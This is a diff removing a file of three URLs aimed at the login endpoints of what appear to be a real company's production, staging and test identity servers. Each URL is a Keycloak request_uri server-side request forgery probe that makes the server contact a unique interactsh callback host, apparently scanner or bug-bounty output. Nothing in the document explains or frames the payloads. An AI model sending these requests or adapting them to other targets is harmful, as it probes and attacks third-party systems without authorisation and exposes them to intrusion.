@@ -1,6 +1,0 @@
-
- https://id.cloud.arrival.com/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://c5uifblbr00c9rclffigcf61ipayyyjws.interactsh.com/
-
- 
- https://id.stage.cloud.arrival.co/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://c5uifblbr00c9rclffigcf61ipayyyjik.interactsh.com/
- https://id.test.cloud.arrival.co/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://c5uifblbr00c9rclffigcf61ipayyyji1.interactsh.com/
